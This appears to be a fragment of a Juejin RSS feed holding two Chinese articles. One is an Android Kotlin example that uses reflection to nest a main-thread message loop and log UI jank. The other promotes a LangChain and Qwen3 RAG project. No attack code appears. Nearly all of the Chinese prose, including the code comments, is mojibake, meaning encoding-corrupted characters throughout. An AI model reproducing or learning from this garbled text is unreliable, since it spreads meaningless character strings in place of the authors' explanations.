ç­”æ¡ˆæ˜¯ï¼šä¸»çº¿ç¨‹ä¼šè¢«é˜»å¡åœ¨è¿™ä¸ªæ¶ˆæ¯é‡Œã€‚</p>
<p>ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åœ¨æˆ‘ä»¬çš„æ­»å¾ªç¯é‡Œï¼Œ<strong>æ‰‹åŠ¨é€šè¿‡åå°„å»è°ƒç”¨ <code>MessageQueue.next()</code> å’Œ <code>Handler.dispatchMessage()</code>ï¼Œæˆ‘ä»¬å°±ç›¸å½“äºåœ¨ä¸»çº¿ç¨‹åŸæœ‰çš„ Loop é‡Œé¢åµŒå¥—äº†ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„ Loopã€‚</strong></p>
<p>è¿™æ ·ï¼Œæˆ‘ä»¬æ—¢æ¥ç®¡äº†æ¶ˆæ¯åˆ†å‘æƒï¼ˆå¯ä»¥è½»æ¾è®¡ç®—åˆ†å‘è€—æ—¶ï¼‰ï¼Œåˆæ²¡æœ‰è®©ä¸»çº¿ç¨‹ç˜«ç—ªã€‚</p>
<h3 data-id="heading-6">å®ç°ä»£ç </h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> android.<span class="hljs-keyword">annotation</span>.SuppressLint
<span class="hljs-keyword">import</span> android.os.Handler
<span class="hljs-keyword">import</span> android.os.Looper
<span class="hljs-keyword">import</span> android.os.Message
<span class="hljs-keyword">import</span> android.os.MessageQueue
<span class="hljs-keyword">import</span> android.util.Log
<span class="hljs-keyword">import</span> java.lang.reflect.Field
<span class="hljs-keyword">import</span> java.lang.reflect.Method

<span class="hljs-keyword">object</span> LooperMonitor {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> TAG = <span class="hljs-string">"LooperMonitor"</span>
    <span class="hljs-comment">// é˜ˆå€¼ï¼šè¶…è¿‡ 100ms è§†ä¸ºå¡é¡¿</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> BLOCK_THRESHOLD = <span class="hljs-number">100L</span>

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">startMonitor</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> mainHandler = Handler(Looper.getMainLooper())

        <span class="hljs-comment">// å‘ä¸»çº¿ç¨‹å‘é€ä¸€ä¸ªâ€œæ¯’ä¸¸â€æ¶ˆæ¯ï¼Œæ¥ç®¡ Loop</span>
        mainHandler.post {
            hijackLooper()
        }
    }

    <span class="hljs-meta">@SuppressLint(<span class="hljs-string">"DiscouragedPrivateApi"</span>)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">hijackLooper</span><span class="hljs-params">()</span></span> {
        Log.i(TAG, <span class="hljs-string">"Looper Hijack Started!"</span>)

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. åå°„è·å– MessageQueue</span>
            <span class="hljs-keyword">val</span> mainLooper = Looper.getMainLooper()
            <span class="hljs-keyword">val</span> queueField: Field = Looper::<span class="hljs-keyword">class</span>.java.getDeclaredField(<span class="hljs-string">"mQueue"</span>)
            queueField.isAccessible = <span class="hljs-literal">true</span>
            <span class="hljs-keyword">val</span> messageQueue = queueField.<span class="hljs-keyword">get</span>(mainLooper) <span class="hljs-keyword">as</span> MessageQueue

            <span class="hljs-comment">// 2. åå°„è·å– MessageQueue.next() æ–¹æ³•</span>
            <span class="hljs-keyword">val</span> nextMethod: Method = MessageQueue::<span class="hljs-keyword">class</span>.java.getDeclaredMethod(<span class="hljs-string">"next"</span>)
            nextMethod.isAccessible = <span class="hljs-literal">true</span>

            <span class="hljs-comment">// 3. åå°„è·å– Message.target å­—æ®µ (Handler)</span>
            <span class="hljs-keyword">val</span> targetField: Field = Message::<span class="hljs-keyword">class</span>.java.getDeclaredField(<span class="hljs-string">"target"</span>)
            targetField.isAccessible = <span class="hljs-literal">true</span>

            <span class="hljs-comment">// 4. åå°„è·å– Message.recycleUnchecked() æ–¹æ³• (ç”¨äºå›æ”¶)</span>
            <span class="hljs-comment">// æ³¨æ„ï¼šä¸åŒç‰ˆæœ¬ API recycle æ–¹æ³•åå¯èƒ½ä¸åŒï¼Œè¿™é‡Œç®€åŒ–å¤„ç†ï¼Œæˆ–è€…ç›´æ¥ä¸æ‰‹åŠ¨ recycle ç­‰å¾…ç³»ç»Ÿå¤„ç†</span>
            <span class="hljs-keyword">val</span> recycleMethod = Message::<span class="hljs-keyword">class</span>.java.getDeclaredMethod(<span class="hljs-string">"recycleUnchecked"</span>)
            recycleMethod.isAccessible = <span class="hljs-literal">true</span>

            <span class="hljs-comment">// 5. å¼€å¯æˆ‘ä»¬è‡ªå·±çš„æ­»å¾ªç¯ï¼Œä»£æ›¿ Looper.loop()</span>
            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
                <span class="hljs-comment">// æ‰‹åŠ¨è°ƒç”¨ next()ï¼Œè¿™é‡Œå¯èƒ½ä¼šé˜»å¡ï¼Œå°±åƒåŸç”Ÿçš„ loop() ä¸€æ ·</span>
                <span class="hljs-keyword">val</span> msg = nextMethod.invoke(messageQueue) <span class="hljs-keyword">as</span>? Message ?: <span class="hljs-keyword">return</span>

                <span class="hljs-keyword">val</span> handler = targetField.<span class="hljs-keyword">get</span>(msg) <span class="hljs-keyword">as</span>? Handler

                <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) {
                    <span class="hljs-comment">// æ²¡æœ‰ target çš„æ¶ˆæ¯é€šå¸¸æ„å‘³ç€é€€å‡º loopï¼Œä½†åœ¨ä¸»çº¿ç¨‹ä¸€èˆ¬ä¸ä¼šé‡åˆ°</span>
                    <span class="hljs-keyword">return</span>
                }

                <span class="hljs-comment">// --- ç›‘æ§å¼€å§‹ ---</span>
                <span class="hljs-keyword">val</span> startTime = System.currentTimeMillis()

                <span class="hljs-comment">// æ‰§è¡Œåˆ†å‘</span>
                handler.dispatchMessage(msg)

                <span class="hljs-comment">// --- ç›‘æ§ç»“æŸ ---</span>
                <span class="hljs-keyword">val</span> endTime = System.currentTimeMillis()
                <span class="hljs-keyword">val</span> cost = endTime - startTime

                <span class="hljs-keyword">if</span> (cost &gt; BLOCK_THRESHOLD) {
                    Log.w(TAG, <span class="hljs-string">"UI å¡é¡¿æ£€æµ‹: è€—æ—¶ <span class="hljs-subst">${cost}</span>ms | Target: <span class="hljs-subst">${handler.javaClass.name}</span>"</span>)
                    <span class="hljs-comment">// æ­¤æ—¶å¯ä»¥æŠ“å–å †æ ˆä¿¡æ¯ï¼šThread.currentThread().stackTrace</span>
                }

                <span class="hljs-comment">// å›æ”¶æ¶ˆæ¯ (æ¨¡æ‹Ÿ Looper.loop çš„è¡Œä¸º)</span>
                recycleMethod.invoke(msg)
            }
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            Log.e(TAG, <span class="hljs-string">"Hijack failed"</span>, e)
            <span class="hljs-comment">// å¦‚æœå‡ºé”™äº†ï¼Œæœ€å¥½æŠ›å‡ºå¼‚å¸¸æˆ–è€…æ¢å¤ç°åœºï¼Œå¦åˆ™ App å¯èƒ½ ANR</span>
        }
    }
}
</code></pre>
<p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä»æ—¥å¿—ä¸­çœ‹åˆ°</p>
<pre><code class="hljs language-log" lang="log">2025-11-24 21:43:20.402  7774-7774  LooperMonitor           com.hualee.myapplication             I  Looper Hijack Started!
2025-11-24 21:43:20.511  7774-7774  LooperMonitor           com.hualee.myapplication             W  UI å¡é¡¿æ£€æµ‹: è€—æ—¶ 108ms | Target: android.app.ActivityThread$H
2025-11-24 21:43:20.733  7774-7774  LooperMonitor           com.hualee.myapplication             W  UI å¡é¡¿æ£€æµ‹: è€—æ—¶ 222ms | Target: android.view.Choreographer$FrameHandler

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChainÃ—Qwen3ï¼šé«˜æ€§èƒ½RAGç³»ç»Ÿå®æˆ˜é¡¹ç›®]]></title>    <link>https://juejin.cn/post/7576273949178183743</link>    <guid>https://juejin.cn/post/7576273949178183743</guid>    <pubDate>2025-11-24T13:04:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576273949178183743" data-draft-id="7576129509934628883" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChainÃ—Qwen3ï¼šé«˜æ€§èƒ½RAGç³»ç»Ÿå®æˆ˜é¡¹ç›®"/> <meta itemprop="keywords" content="LangChain,LLM,ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2025-11-24T13:04:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§æ¨¡å‹æ•™ç¨‹"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChainÃ—Qwen3ï¼šé«˜æ€§èƒ½RAGç³»ç»Ÿå®æˆ˜é¡¹ç›®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§æ¨¡å‹æ•™ç¨‹
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T13:04:04.000Z" title="Mon Nov 24 2025 13:04:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body blockquote&gt;p{margin:0}.markdown-body .math{font-style:italic;margin:12px 0;padding:.5em 1em;background-color:#f8f5ff}.markdown-body .math&gt;p{margin:0}.markdown-body code{padding:2px .4em;overflow-x:auto;color:#a862ea;font-weight:700;word-break:break-word;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;background-color:#f8f5ff}.markdown-body pre{margin:2em 0}.markdown-body pre&gt;code{display:block;padding:1.5em;word-break:normal;font-size:.9em;font-style:normal;font-weight:400;font-family:Operator Mono,Consolas,Monaco,Menlo,monospace;line-height:18px;color:#383838;border-radius:2px;scroll-behavior:smooth;box-shadow:0 0 10px #e7daff}.markdown-body pre&gt;code:hover{box-shadow:0 0 20px #e7daff}.markdown-body pre&gt;code::-webkit-scrollbar{height:6px;background-color:#f8f5ff}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:#e7daff;border-bottom-left-radius:3px;border-bottom-right-radius:3px}.markdown-body hr{margin:2em 0;border-top:1px solid #a862ea}.markdown-body table{width:100%;font-size:12px;max-width:100%;overflow:auto;border-collapse:collapse}.markdown-body thead{color:#a862ea;background:#f8f5ff}.markdown-body td,.markdown-body th{padding:.5em;border:1px solid #e7daff}.markdown-body tr{background-color:#f8f5ff}@media (max-width:720px){.markdown-body{font-size:12px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote>
<p>å¤§æ¨¡å‹è™½ç„¶å¼ºå¤§ï¼Œä½†ä¾ç„¶å­˜åœ¨ä¸¤å¤§ç—›ç‚¹ï¼š</p>
<ul>
<li><strong>å¹»è§‰é—®é¢˜</strong>ï¼šæ¨¡å‹å¯èƒ½åœ¨ç¼ºä¹äº‹å®æ”¯æ’‘æ—¶â€œç¼–é€ ç­”æ¡ˆâ€ï¼›</li>
<li><strong>çŸ¥è¯†æ–­å±‚</strong>ï¼šåªèƒ½ä¾èµ–è®­ç»ƒæ—¶çš„å­˜é‡çŸ¥è¯†ï¼Œæ— æ³•è¦†ç›–æœ€æ–°æˆ–å‚ç›´é¢†åŸŸçš„ä¿¡æ¯ã€‚</li>
</ul>
<p>è¿™æ—¶ï¼Œ<strong>RAGï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰</strong> æˆä¸ºè§£å†³æ–¹æ¡ˆã€‚å®ƒçš„æ€è·¯å¾ˆç›´æ¥ï¼š</p>
<ol>
<li><strong>å…ˆæ£€ç´¢</strong>â†’ä»å¤–éƒ¨çŸ¥è¯†åº“æ‰¾åˆ°ç›¸å…³ä¿¡æ¯ï¼›</li>
<li><strong>å†ç”Ÿæˆ</strong>â†’æŠŠæ£€ç´¢ç»“æœäº¤ç»™å¤§æ¨¡å‹å›ç­”é—®é¢˜ã€‚</li>
</ol>
<p>è¿™ç§â€œæ£€ç´¢+ç”Ÿæˆâ€çš„ç»„åˆï¼Œä¸ä»…èƒ½é™ä½å¹»è§‰ç‡ï¼Œè¿˜èƒ½è®©æ¨¡å‹æ›´å¿«é€‚åº”æ–°çš„çŸ¥è¯†åœºæ™¯ã€‚</p>
<p>æœ¬æœŸæ¨èå’Œé²¸ç¤¾åŒºåˆ›ä½œè€…@äº‘é€¸ï½åˆ†äº«çš„LangChain RAGç³»ç»Ÿå®æˆ˜é¡¹ç›®ï¼Œå…¶å®Œæ•´æ¼”ç¤ºäº†å¦‚ä½•ç»“åˆ<strong>LangChainæ¡†æ¶</strong>ä¸<strong>Qwen3æ¨¡å‹</strong>ï¼Œä»æ•°æ®ç´¢å¼•åˆ°æ¥å£æœåŠ¡ï¼Œæ­å»ºå‡ºä¸€ä¸ªå¯è½åœ°çš„RAGé—®ç­”ç³»ç»Ÿã€‚</p>
<h2 data-id="heading-0">ä¸ºä»€ä¹ˆé€‰æ‹©LangChainï¼Ÿ</h2>
<p>å®ç°ä¸€ä¸ªRAGç³»ç»Ÿå¹¶ä¸å¤æ‚ï¼Œä½†è¦æŠŠæ•´ä¸ªé“¾è·¯ä»æ•°æ®åŠ è½½ã€å‘é‡åŒ–ã€æ£€ç´¢ã€æ’åºåˆ°ç”Ÿæˆæ‰“é€šï¼Œè¿‡ç¨‹å†—é•¿ã€‚<strong>LangChain</strong>çš„ä¼˜åŠ¿å°±åœ¨äºå®ƒçš„æ¨¡å—åŒ–å’Œç”Ÿæ€æ”¯æŒï¼š</p>
<ul>
<li><strong>ç°æˆç»„ä»¶</strong>ï¼šæ•°æ®åˆ‡åˆ†ã€å‘é‡æ•°æ®åº“ã€æ£€ç´¢å™¨ã€é—®ç­”é“¾ç­‰å¼€ç®±å³ç”¨ï¼›</li>
<li><strong>ç”Ÿæ€ä¸°å¯Œ</strong>ï¼šæ”¯æŒFAISSã€Milvusã€Pineconeç­‰æ•°æ®åº“ï¼Œä¹Ÿå…¼å®¹OpenAIã€Qwenç­‰Embeddingå’ŒLLMï¼›</li>
<li><strong>å¯æ‰©å±•</strong>ï¼šä¸ä»…èƒ½åšRAGï¼Œè¿˜èƒ½æ‰©å±•åˆ°å¤šæ­¥æ¨ç†ã€å·¥å…·è°ƒç”¨ã€å¯¹è¯è®°å¿†ç­‰å¤æ‚åº”ç”¨ã€‚</li>
</ul>
<p>è¿™æ„å‘³ç€å¼€å‘è€…å¯ä»¥æŠŠæ›´å¤šç²¾åŠ›æ”¾åœ¨ä¸šåŠ¡é€»è¾‘å’Œæ•ˆæœä¼˜åŒ–ä¸Šï¼Œè€Œä¸æ˜¯ä»é›¶é€ è½®å­ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4b479330c8442dc9cf3fc2343f2fb8d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764594244&amp;x-signature=%2BJ3tiFsXHr4bGHeXgkSBqRD%2B2qo%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">å¹²è´§è§£æï¼šRAGä¸‰æ­¥èµ°</h2>
<p>åœ¨é¡¹ç›®ä¸­ï¼ŒRAG çš„æ ¸å¿ƒæµç¨‹è¢«æ‹†è§£ä¸ºä¸‰æ­¥ï¼Œæ¯ä¸€æ­¥éƒ½æœ‰æ¸…æ™°çš„å®ç°ï¼š</p>
<h3 data-id="heading-2">æ„å»ºç´¢å¼•ï¼šè®©æ–‡æ¡£â€œèƒ½è¢«ç†è§£â€</h3>
<ul>
<li><strong>é¡¹ç›®åšæ³•</strong>ï¼šåŠ è½½å››å¤§åè‘—ç­‰ä¸­æ–‡å¤å…¸å°è¯´ï¼Œå…ˆåˆ‡åˆ†æˆåˆé€‚çš„ç‰‡æ®µï¼Œå†ç”¨<strong>Qwen3-Embedding-4B</strong>å°†å…¶å‘é‡åŒ–ã€‚</li>
<li><strong>ä»·å€¼</strong>ï¼šEmbedding æŠŠæ–‡æœ¬å˜æˆâ€œè¯­ä¹‰åæ ‡â€ï¼Œå­˜å…¥<strong>FAISSå‘é‡æ•°æ®åº“</strong>ï¼Œè®©æ¨¡å‹èƒ½æŒ‰è¯­ä¹‰ç›¸ä¼¼åº¦æ£€ç´¢ï¼Œè€Œä¸æ˜¯æ­»æ¿çš„å…³é”®è¯åŒ¹é…ã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dc4e77f549204ce59fa1b36c996edd06~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764594244&amp;x-signature=N6CrO0BESML0H66HknHtuCnSC1w%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">æ£€ç´¢ä¸ç²¾æ’ï¼šæ‰¾åˆ°æœ€ç›¸å…³çš„ä¿¡æ¯</h3>
<ul>
<li><strong>é¡¹ç›®åšæ³•</strong>ï¼šå½“ç”¨æˆ·æé—®æ—¶ï¼Œç³»ç»Ÿä¼šç”¨å‘é‡æ£€ç´¢å¬å›å€™é€‰ç‰‡æ®µï¼Œå†ç”¨<strong>Qwen3-Reranker-4B</strong>å¯¹ç»“æœç²¾æ’åºã€‚</li>
<li><strong>ä»·å€¼</strong>ï¼šç²—å¬å›ä¿è¯è¦†ç›–é¢ï¼Œç²¾æ’ä¿è¯å‡†ç¡®æ€§ã€‚è¿™ä¸€æ­¥è§£å†³äº†å¾ˆå¤šâ€œæ£€ç´¢ç»“æœä¸å‡†â€çš„é—®é¢˜ï¼Œè®©ç­”æ¡ˆæ›´è´´è¿‘ç”¨æˆ·é—®é¢˜ã€‚</li>
</ul>
<h3 data-id="heading-4"/>
<h3 data-id="heading-5"/>
<h3 data-id="heading-6">ç”Ÿæˆå›ç­”ï¼šå¤§æ¨¡å‹â€œæœ‰æ®å¯ä¾â€</h3>
<ul>
<li><strong>é¡¹ç›®åšæ³•</strong>ï¼šå°†æ’åºåçš„ä¸Šä¸‹æ–‡ä¸é—®é¢˜ä¸€èµ·æ‰“åŒ…æˆpromptï¼Œäº¤ç»™å¤§æ¨¡å‹ï¼Œé€šè¿‡<strong>LangChainçš„RetrievalQAæ¨¡å—</strong>ç”Ÿæˆç­”æ¡ˆã€‚</li>
<li><strong>ä»·å€¼</strong>ï¼šå¤§æ¨¡å‹çš„è¾“å‡ºä¸å†æ˜¯â€œçç¼–â€ï¼Œè€Œæ˜¯åŸºäºæ£€ç´¢ç»“æœçš„æ€»ç»“ä¸æ¨ç†ï¼Œæ˜¾è‘—é™ä½å¹»è§‰ã€‚</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/67c3718a754f41089d41d9219d908fd8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764594244&amp;x-signature=zaYEOLWCFMv7BW%2FVCz%2F9hwVs1gQ%3D" alt="" loading="lazy"/></p>
<p>é€šè¿‡è¿™ä¸‰æ­¥ï¼Œé¡¹ç›®æ‰“é€šäº†RAGçš„å®Œæ•´é—­ç¯ï¼Œå½¢æˆäº†ä¸€ä¸ªå¯å®é™…ä½¿ç”¨çš„é—®ç­”ç³»ç»Ÿã€‚</p>
<h2 data-id="heading-7">é¡¹ç›®äº®ç‚¹</h2>
<ul>
<li><strong>Embedding+Rerankerç»„åˆ</strong>ï¼šä½¿ç”¨<strong>Qwen3-Embedding-4B</strong>åšè¯­ä¹‰æ£€ç´¢ï¼Œ<strong>Qwen3-Reranker-4B</strong>ç²¾æ’åºï¼Œæå¤§æå‡æ£€ç´¢ç»“æœçš„ç›¸å…³æ€§ã€‚</li>
<li><strong>å…¨æµç¨‹æ‰“é€š</strong>ï¼šä»æ–‡æ¡£åŠ è½½ã€ç´¢å¼•æ„å»ºï¼Œåˆ°FastAPIæœåŠ¡ä¸Šçº¿ï¼Œå®Œæ•´è¦†ç›–ä»ç ”å‘åˆ°åº”ç”¨å…¨è¿‡ç¨‹ã€‚</li>
<li><strong>çœŸå®è°ƒè¯•ç»éªŒ</strong>ï¼šé¡¹ç›®ä¸­è®°å½•äº†æ˜¾å­˜æº¢å‡ºã€ç±»å‹æŠ¥é”™ç­‰å¸¸è§é—®é¢˜åŠè§£å†³æ–¹æ¡ˆï¼Œè´´è¿‘ä¸€çº¿å¼€å‘å®è·µã€‚</li>
<li><strong>æ‰©å±•æ€§å¼º</strong>ï¼šé¡¹ç›®ç•™å‡ºäº†ä¼˜åŒ–ç©ºé—´ï¼Œæ¯”å¦‚æ›´çµæ´»çš„åˆ†å—ç­–ç•¥ã€æ›´æ™ºèƒ½çš„promptè®¾è®¡ï¼Œé€‚åˆäºŒæ¬¡å¼€å‘ã€‚</li>
</ul>
<p>ğŸ’»ä¸€é”®Forké¡¹ç›®ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.heywhale.com%2Fu%2Fbf1ecb" target="_blank" title="https://www.heywhale.com/u/bf1ecb" ref="nofollow noopener noreferrer">www.heywhale.com/u/bf1ecb</a>ï¼ˆå¤åˆ¶è‡³æµè§ˆå™¨æ‰“å¼€ï¼‰</p>
<h2 data-id="heading-8">å­¦ä¹ èµ„æºæ¨è</h2>
<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥åœ°å­¦ä¹ å¤§æ¨¡å‹ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›éå¸¸æœ‰ä»·å€¼çš„å­¦ä¹ èµ„æºï¼Œè¿™äº›èµ„æºå°†å¸®åŠ©ä½ ä»ä¸åŒè§’åº¦å­¦ä¹ å¤§æ¨¡å‹ï¼Œæå‡ä½ çš„å®è·µèƒ½åŠ›ã€‚</p>
<blockquote>
